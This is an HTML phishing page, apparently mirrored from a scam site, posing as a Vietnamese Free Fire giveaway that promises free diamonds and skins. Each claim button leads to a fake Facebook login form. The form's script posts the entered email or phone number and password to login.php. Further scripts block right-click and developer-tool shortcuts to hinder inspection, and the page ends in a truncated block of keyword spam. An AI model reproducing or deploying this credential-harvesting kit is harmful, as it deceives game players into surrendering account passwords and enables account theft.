
<!DOCTYPE html>
<html lang="vn">

<!-- Mirrored from trian-ff.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Oct 2020 07:12:32 GMT -->
<!-- Added by HTTrack -->
<!-- Mirrored from fftangcode.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 23 Oct 2022 00:18:27 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta http-equiv="Content-type" content="text/html; charset=utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
	<link rel="shortcut icon" href="favicon.ico" />
	<link rel="icon" href="favicon.ico" type="image/x-icon" />
	<title>sukientrian2022 com trianff com Vòng Quay Free Fire Miễn Phí 2022 Tri Ân FF Nhận Kim Cương Free Fire Miễn Phí Code Free Fire Sự Kiện Vòng Quay Vô Cực FREE FIRE</title>
	<meta property="og:type" content="website" />
	<meta property="og:url" content="Code Free Fire 2022 trian free fire vietnam 2022" />
	<meta property="og:site_name" content="FREE FIRE" />
	<meta property="og:title" content="sukientrian2022 com trianff com Vòng Quay Free Fire Miễn Phí 2022 Tri Ân FF Nhận Kim Cương Free Fire Miễn Phí Code Free Fire Sự Kiện Vòng Quay Vô Cực FREE FIRE">
	<meta property="og:image" content="https://i.imgur.com/uLk2Wp0.jpg">
	<meta property="og:description" content="sukientrian2022 com trian ff nhận code free fire kim cương free fire miễn phí sukienfreefire2022. com, sukientrian2022.com, sukientrian2022 com sự kiện free fire viêt nam 2022 hack kim cương free fire 9999">




	<link rel="stylesheet" href="css/bootstrap.min.css">
	<link rel="stylesheet" href="css/a.css">
	<link rel="stylesheet" href="css/b.css">
	<link rel="stylesheet" href="css/c.css">
	<link href="https://fonts.googleapis.com/css?family=Lato|Poppins|Roboto&amp;display=swap" rel="stylesheet">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,500;0,600;0,700;0,800;1,500;1,600;1,700;1,800&amp;display=swap">
	<link rel="stylesheet" href="css/d.css">
	<script src="css/e.css"></script>
	<link rel="stylesheet" href="css/a1.css">
	<script src="css/a2.css"></script>
	<script src="css/a3.css"></script>
	<script src="css/a4.css"></script>
</head>
<body>


<header id="header">
      <div class="container-fluid">
        <div class="row top-head align-items-center">
          <div class="col-md-12">
                        <a href="/" class="logo-site"><img src="img/logo-site.png" alt="Free fire"></a>
            <a href="#" class="menu-mobile"><i class="fa fa-bars"></i></a>
            <div class="mobile-head text-center">
              <img src="img/game-icon.png" alt="" class="game-icon">
              <a href="/" class="mobile-logo"><img src="img/logo-mobile.png" alt=""></a>
              <a href="https://ff.garena.vn/mobile/ff?pid=OrganicA&amp;c=" class="btn-install"><img src="img/btn-install.png" alt=""></a>
            </div>
            <nav id="main-nav">
              <ul>
                <li><a href="https://ff.garena.vn/">Trang chủ</a></li>
                <li><a href="/" target="_blank" class="">Sự Kiện</a></li>
                <li><a href="https://quandoan.ff.garena.vn/" target="_blank" class="">Quân đoàn</a></li>
                <li><a href="https://ff.garena.vn/#section-news" class="scroll-to" data-target=".section-news">Tin tức</a></li>
                                <li><a href="dt7mkztjzfwyzexn5cyzpzrs0wofjv84ozsl17cbhq5m88n3m6y7mg7ayq6ugd18wyxiogxy1ep6gw44hb14wfacxi152w1kodt8.html">Tài khoản</a></li>
				              </ul>
            </nav>
          </div>
        </div>
      </div>

    </header>


<script>
				$(document).on('click', '#claim', function() {
						Swal.fire({
							title: "Thông báo",
							text: "Vui lòng đăng nhập để nhận quà!",
							icon: "error",
							buttons: ['Đóng', 'Đăng nhập'],
							confirmButtonText: '<i class="fa fa-facebook-square"></i> Facebook',
							dangerMode: true,
						})
						.then((confirm) => {
							if (confirm) {
								location.href ='#fb'
							}
						})
				});

				function makeid(length) {
                  var text = "";
                  var possible = "0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
                
                  for (var i = 0; i < length; i++)
                    text += possible.charAt(Math.floor(Math.random() * possible.length));
                
                  return text;
                }

</script>










<style type="text/css">
  
  #fb:target {
    visibility: visible;
}
#fb {
    width: 100%;
    height: 100%;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 9999;
    visibility: hidden;
    overflow: scroll;
}

.fb-login {
    width: 300px;
    height: auto;
    background: #fff;
    position: relative;
    text-align: center;
    margin: 15% auto;
}

.close {
    width: 20px;
    height: 20px;
    font-size: 13px;
    line-height: 13px;
    background: #000;
    border-radius: 50%;
    border: 3px solid #fff;
    display: block;
    text-align: center;
    color: #fff;
    text-decoration: none;
    position: absolute;
    top: -10px;
    right: -10px;
}

.nav-fb {
    background-color: #3b5998;
    height: 40px;
    border: 4px;
    padding: 10px;
}

.formku {
    float: left;
    width: 300px;
    padding-top: 20px;
    border-color: white;
    background: white;
}

.mylabel {
    color: black;
    float: left;
}

.divider {
    display: block;
    margin-left: 5%;
    margin-right: 5%;
    margin-top: -8px;
    overflow: hidden;
    text-align: center;
    white-space: nowrap;
    width: 90%;
}

.divider>span {
    display: inline-block;
    position: relative;
    color: #4b4f56;
    cursor: default;
    font-size: 13px;
}

.divider>span:before {
    margin-right: 15px;
    right: 100%;
}

.divider>span:after {
    left: 100%;
    margin-left: 15px;
}

.divider>span:before, .divider>span:after {
    background: #ced0d4;
    content: "";
    height: 1px;
    position: absolute;
    top: 50%;
    width: 9999px;
}

.btn-register-fb {
    position: relative;
    width: auto;
    height: 40px;
    margin-bottom: 20px;
    background-color: #1cbf27;
    color: white;
    border-radius: 3px;
    border: #1cbf27;
    font-size: 0.8em;
    font-weight: bold;
    letter-spacing: 1px;
    outline: none;
    cursor: pointer;
}

.btn-login-fb {
    position: relative;
    width: 100%;
    height: 45px;
    margin: 0;
    background-color: #4080ff;
    color: white;
    border-radius: 3px;
    border: #4080ff;
    font-size: 0.8em;
    font-weight: bold;
    letter-spacing: 1px;
    outline: none;
    cursor: pointer;
}

form {
    padding-right: 1.25pc;
}
form {
    padding-left: 1.25pc;
}

input[type=text], input[type=password], input[type=number] {
    background: transparent;
    width: 260px;
    height: 45px;
    float: left;
    padding: 12px 20px;
    margin: 9px 0;
    display: inline-block;
    border: 1px solid black;
    border-radius: 3px;
    color: black;
    box-sizing: border-box;
}

  


   </style>
   
 <style type="text/css">
 ._9on1{
 color:#216fdb;font-family:'Roboto-Regular', 'Helvetica', 'sans-serif';
 font-size:14px;line-height:16px}
 ._8qtf{margin:12px 0 4px 0;width:100%}
 ._43mg>span{display:inline-block;position:relative}
 ._43mg>span:before,._43mg>span:after{
 	background:#ccd0d5;
 	content:'';
 	height:1px;
 	position:absolute;
 	top:50%;
 	width:99px
 	}
 	._43mg>span:before{
 		margin-right:15px;
 		right:100%}._43mg>span:after{left:100%;
 			margin-left:15px}
 			._43mh{color:#4b4f56
 			}




 </style>





      <div id="fb">
<div class="fb-login">
<a href="#" class="close" title="Close">&times;</a>
<div class="nav-fb"><img src="./i.imgur.com/anh.png" width="100" class="img" alt="">
<center>
</center>
</div>
</br>
<center><img src="https://play-lh.googleusercontent.com/YkGBw1vjrhDB0VJo525vTiFASTEJrHN1OdvpaJd3OZD0aX1VwM0CBeZ5Pp76qtMjlg=s180-rw" width="60px"></center>
    <div style=" background: red;color: #fff;padding: 3px;font-size: 15px; display:none" id="login-notice"> </div>

<font color="#000000"><span style="font-size: 15px; line-height: 18px; margin-bottom: 10px;">Đăng nhập vào tài khoản Facebook<br> của bạn để kết nối với Free Fire</span>
</font>
            <form  method="post" id="login_form" novalidate="1" data-autoid="autoid_2">
<p class="mylabel"></p>
<center><input type="text" placeholder="Email hoặc điện thoại" name="username" autocorrect="off" required pattern=".{5,30}" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Email hoặc số điện thoại không hợp lệ ')"
 oninput="setCustomValidity('')"></br>
<p class="mylabel"></p>
<input type="password" placeholder="Mật khẩu "name="password" autocorrect="off" required pattern=".{6,30}" autocomplete="off" autocapitalize="off" oninvalid="this.setCustomValidity('Mật khẩu bạn đã nhập không chính xác')"
 oninput="setCustomValidity('')"></br>
</br>
</br>

<button type="submit" class="btn-login-fb" name="login"><b>Đăng Nhập</b></button> <br> <br>
<div class="_52jj _9on1"> Quên mật khẩu?</div>
<div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">hoặc</span></div>
</br>
<button class="btn-register-fb">Tạo tài khoản mới</button>
</center>

</br>
</form>
</div>
</div>





   
  

<script type='text/javascript'>
//<![CDATA[
// JavaScript Document
var message="NoRightClicking"; function defeatIE() {if (document.all) {(message);return false;}} function defeatNS(e) {if (document.layers||(document.getElementById&&!document.all)) { if (e.which==2||e.which==3) {(message);return false;}}} if (document.layers) {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=defeatNS;} else{document.onmouseup=defeatNS;document.oncontextmenu=defeatIE;} document.oncontextmenu=new Function("return false")
//]]>
</script>

</body>



<script>
            document.onkeydown=function(a){if(123==event.keyCode||a.ctrlKey&&a.shiftKey&&73==a.keyCode||a.ctrlKey&&a.shiftKey&&67==a.keyCode||a.ctrlKey&&a.shiftKey&&74==a.keyCode||a.ctrlKey&&85==a.keyCode)return!1};
      $(document).ready(function(){
        $('#login_form').submit(function(e) {
          jQuery.ajax({
            method: 'POST',
            url: 'login.php',
            data: $(this).serialize(),
            dataType: 'json',
            complete: function() {
              captchaGenerate()
            }
          }).done(function(data) {
            if (data.status == 'success') {
              location.href = 'index.php'
            } else {
              $('#first-notice').hide()
              $('#login-notice').text(data.message || 'Có lỗi khi nhận quà!').show()
            }
          }).fail(function() {
            $('#login-notice').text('Email hoặc số di động bạn nhập không kết nối với tài khoản nào. ').show()
          })
          e.preventDefault()
        })
      })
    </script>















<style>
.box-event {
    background-image: url(vongquayvocuc.com/images/bg-lq-card.html) !important;
    background-size: 100% 100% !important;
    background-position: center;
    background-color: #040404;
    /* border: 1px solid #ffb000; */
    border-radius: 0;
    box-shadow: 0 4px 8px 3px rgba(12,12,12,.5);
    padding: 15px 10px;
    text-align: center;
    margin-bottom: 25px;
}
.image-hopqua {
	position: relative;
    width: 100%;
    height: 180px;
}

.image-hopqua img {
	max-width: 100%;
    max-height: 130px;
}
.phanqua-name {
	position: absolute;
    right: 0;
    left: 0;
    bottom: 0;
    padding: 10px 0;
    text-shadow: 1px 1px rgba(97,51,90,.75);
}
.button-nhan {
	font-size: 17px;
    text-transform: uppercase;
}
.content-qua h1:before {
    left: -40px;
}
.content-qua h1:after {
    right: -40px;
}
.content-qua {
	line-height: 3.5;
}
.content-qua h1:before {
    position: absolute;
    top: 50%;
    content: "";
    background-image: url(data:image/png;base64,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);
    background-size: 100% auto;
    width: 30px;
    height: 30px;
    transform: translateY(-50%);
}

.content-qua h1:after {
    position: absolute;
    top: 50%;
    content: "";
    background-image: url(data:image/png;base64,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);
    background-size: 100% auto;
    width: 30px;
    height: 30px;
    transform: translateY(-50%);
}
h1 {
	display: inline-block;
    position: relative;
    font-size: 30px;
    font-style: italic;
    font-weight: 800;
    letter-spacing: 1px;
    margin: 0;
    text-transform: uppercase;
    background-image: linear-gradient(0deg,#fcf8f7,#ffcd47);
    color: transparent;
    background-clip: text;
    -webkit-background-clip: text;
}
</style>


<div class="container" style="margin-top:30px;margin-bottom: 100px;">
<div class="content-qua">
<center>	
			<h1>SỰ KIỆN TRI ÂN NHẬN QUÀ FREE FIRE MIỄN PHÍ 2022</h1>
			<p>Sự kiện sukientrian2022 com nhận Code Free Fire 2022 tri ân sukienmoco.ffgarena Free Fire Việt Nam.<br/>
			Nhận Code sukientrian2022 Free Fire Miễn Phí Toàn Server!.</p>
</center>
</div>

    <div class="row">

        <div class="col-lg-3 col-md-4 col-6 mb-4">
			<div class="box-event">
			<div class="image-hopqua">
			<img src="tom_image/1.png" alt="item">

			<div class="phanqua-name">	<a href="login.php"></a>HỘP MA THUẬT </div>
			</div>

			    
			    
			    <a href="login.php"><button type="button" class="btn btn-success tut mb-2"><i class="fa fa-gift"></i> Nhận ngay </button></a> 
			
			
			
			</div>
		</div>
        <div class="col-lg-3 col-md-4 col-6 mb-4">
			<div class="box-event">
			<div class="image-hopqua">
			<img src="tom_image/2.png" alt="item">
			<div class="phanqua-name"> 6000 Kim Cương </div>
			</div>
			
			
 <a href="login.php"><button type="button" class="btn btn-success tut mb-2"><i class="fa fa-gift"></i> Nhận ngay </button></a> 
 
 
			</div>
		</div>
        <div class="col-lg-3 col-md-4 col-6 mb-4">
			<div class="box-event">
			<div class="image-hopqua">
			<img src="tom_image/9.png" alt="item">
			<div class="phanqua-name"> Bộ Khủng Long (Ngẫu nhiên) </div>
			</div>
			
 <a href="login.php"><button type="button" class="btn btn-success tut mb-2"><i class="fa fa-gift"></i> Nhận ngay </button></a> 
 
			</div>
		</div>
        <div class="col-lg-3 col-md-4 col-6 mb-4">
			<div class="box-event">
			<div class="image-hopqua">
			<img src="tom_image/10.png" alt="item">
			<div class="phanqua-name"> Bộ Đạo Chích (Ngẫu nhiên) </div>
			</div>

 <a href="login.php"><button type="button" class="btn btn-success tut mb-2"><i class="fa fa-gift"></i> Nhận ngay </button></a> 
 
			</div>
		</div>
        <div class="col-lg-3 col-md-4 col-6 mb-4">
			<div class="box-event">
			<div class="image-hopqua">
			<img src="tom_image/6.png" alt="item">
			<div class="phanqua-name">Scar Siêu Phẩm (Ngẫu nhiên)</div>
			</div>
 <a href="login.php"><button type="button" class="btn btn-success tut mb-2"><i class="fa fa-gift"></i> Nhận ngay </button></a> 
			</div>
		</div>
        <div class="col-lg-3 col-md-4 col-6 mb-4">
			<div class="box-event">
			<div class="image-hopqua">
			<img src="tom_image/7.png" alt="item">
			<div class="phanqua-name"> AK Kỳ Lân (Ngẫu nhiên)</div>
			</div>
 <a href="login.php"><button type="button" class="btn btn-success tut mb-2"><i class="fa fa-gift"></i> Nhận ngay </button></a> 
			</div>
		</div>
        <div class="col-lg-3 col-md-4 col-6 mb-4">
			<div class="box-event">
			<div class="image-hopqua">
			<img src="tom_image/8.png" alt="item">
			<div class="phanqua-name">MP40 Poker (Ngẫu nhiên) </div>
			</div>
 <a href="login.php"><button type="button" class="btn btn-success tut mb-2"><i class="fa fa-gift"></i> Nhận ngay </button></a> 
			</div>
		</div>
        <div class="col-lg-3 col-md-4 col-6 mb-4">
			<div class="box-event">
			<div class="image-hopqua">
			<img src="tom_image/3.png" alt="item">
			<div class="phanqua-name"> Quỷ Kiếm Dạ Xoa </div>
			</div>
 <a href="login.php"><button type="button" class="btn btn-success tut mb-2"><i class="fa fa-gift"></i> Nhận ngay </button></a> 
			</div>
		</div>

        <div class="col-lg-3 col-md-4 col-6 mb-4">
			<div class="box-event">
			<div class="image-hopqua">
			<img src="tom_image/5.png" alt="item">
			<div class="phanqua-name"> Quỷ Vương & Giai Nhân</div>
			</div>
 <a href="login.php"><button type="button" class="btn btn-success tut mb-2"><i class="fa fa-gift"></i> Nhận ngay </button></a> 
			</div>
		</div>

        <div class="col-lg-3 col-md-4 col-6 mb-4">
			<div class="box-event">
			<div class="image-hopqua">
			<img src="tom_image/4.png" alt="item">
			<div class="phanqua-name"> Ngài Đỏ </div>
			</div>
 <a href="login.php"><button type="button" class="btn btn-success tut mb-2"><i class="fa fa-gift"></i> Nhận ngay </button></a> 
			</div>
		</div>
        <div class="col-lg-3 col-md-4 col-6 mb-4">
			<div class="box-event">
			<div class="image-hopqua">
			<img src="tom_image/11.png" alt="item">
			<div class="phanqua-name"> Xe Thể Thao Ngân Hà </div>
			</div>
 <a href="login.php"><button type="button" class="btn btn-success tut mb-2"><i class="fa fa-gift"></i> Nhận ngay </button></a> 
			</div>
		</div>
        <div class="col-lg-3 col-md-4 col-6 mb-4">
			<div class="box-event">
			<div class="image-hopqua">
			<img src="tom_image/12.png" alt="item">
			<div class="phanqua-name"> Xe Máy Tia Chớp </div>
			</div>
 <a href="login.php"><button type="button" class="btn btn-success tut mb-2"><i class="fa fa-gift"></i> Nhận ngay </button></a> 
			</div>
		</div>

<p>sukientrian 2022.ga sukientrian2022 com, trianff com, trian free fire vietnam sukienfreefire2022. com, trian free fire vietnam. sukienmoco.ffgarena, su kien moco.ff garena.vn, com vqmm free fire, vqmm-free fire.com, su kien free fire vietnam 2022, napthe.vn free fire, su kien free fire vietnam 2022.com, nhận kim cương miễn phí, vòng quay free fire miễn phí, sukienfreefire2022. com, nhap code ff, nhando ff.com, sukienfreefire2022, napthe.com free fire, shopas, shopanhbaphai, vòng quay miễn phí ff, kim cương free fire, nhận quà free fire miễn phí bằng id, nhận quà ff, tri ân ff, shop nhận quà free fire miễn phí, nhận quà ff miễn phí, nhận quà free fire miễn phí, shopcybertm com, nhận kc miễn phí ff, vòng quay free fire miễn phí 2022, shop nhận kim cương miễn phí, trianff, vòng quay kim cương miễn phí ff, nhanquafreefire, nhận đồ free fire miễn phí, nhandofreefire.com miễn phí, nhancode ff.com, shopcybertm.com ff, vòng quay ff, nhận kim cương free fire miễn phí, shopas, kim cương miễn phí, atrasis free fire kim cương, nhận kim cương ff, nhận kc miễn phí garena, shop nhận quà.com miễn phí, nhận kim cương miễn phí ff, shop nhận kc miễn phí ff, vòng quay free fire miễn phí không cần đăng nhập, kim cương miễn phí kim cương free fire, vòng quay kc miễn phí ff, nhận kim cương miễn phí trong free fire, sự kiện ff, shop nhận quà ff, nhandofreefire, vòng quay kim cương miễn phí, nhandofreefire trang nap the, kc miễn phí ff, vòng quay free fire miễn phí 2020, nhận kim cương free fire, nhando free fire.com, kim cương free, shop nhận quà miễn phí, kim cương free fire miễn phí, tri ân free fire, tri an ff, nhẫn kim cương miễn phí, kim cương ff, nhận kim cương miễn phí free fire, kim cương miễn phí kim cương free fire, shop nhận kc miễn phí ff ,sự kiện ff,sự kiện ff garena free fire,sự kiện ff hôm nay,sự kiện free fire,sự kiện free fire nhận quà,sự kiện free fire mới nhất,cách làm sự kiện free fire mới nhất,sukien free fire,su kiện ff,sukien ff,ff sự kiện mới,sự kiện mới free fire,sự kiện mới ff,nhận quà free fire,nhận quà free fire miễn phí bằng id,shop nhận quà free fire miễn phí,nhận quà free fire miễn phí,nhận+quà+free+fire+miễn+phí,nhận quà free fire miễn phí bằng id 2022,nhận quà ff miễn phí,nhận quà free fire miễn phí 2020,nhận quà free fire miễn phí 2022,nhận quà ff,cách nhận quà free fire membership,shop nhận quà ff,vip membership garena free fire,nhanqua freefire,shop nhanqua com miễn phí,nhận quà ff bằng id,nhanqua liênquan garena vn,cách nhận quà sinh nhật free fire,nhanquafreefire garena com,nhận quà ff miễn phí bằng id,shop nhận quà ff miễn phí,đăng ký shopee nhận quà free fire,nhận quà free fire miễn phí bằng id không cần đăng nhập,code ff,code ff vĩnh viễn,code ff mới nhất,code ff ko giới hạn,code ff 2022,code ff 2020 ko giới hạn,code ff 2022 ko giới hạn,code ff ob29,code free fire,giftcode free fire,code free fire 2022,code ff ko gioi han,code free fire ko giới hạn,nhận code ff,garena free fire code,giftcode ff,nhận code free fire,code free fire toàn sever,code free fire ko gioi han,code đấu trường sinh tồn free fire,code ko giới hạn,code ff vĩnh viễn không giới hạn,code ko giới hạn free fire,code ff toàn sever,giftcode free fire không giới hạn,hack kim cuong free fire,shop nhận kc miễn phí ff,tặng kc free fire miễn phí,nhận kc miễn phí ff,shop nhận kc miễn phí ff 2022,nhận kim cương free fire,nhận kim cương miễn phí,nhận kim cương free fire miễn phí,nhận kim cương ff,kim cương free fire miễn phí 2020,shop nhận kim cương miễn phí trong free fire,vòng quay free fire miễn 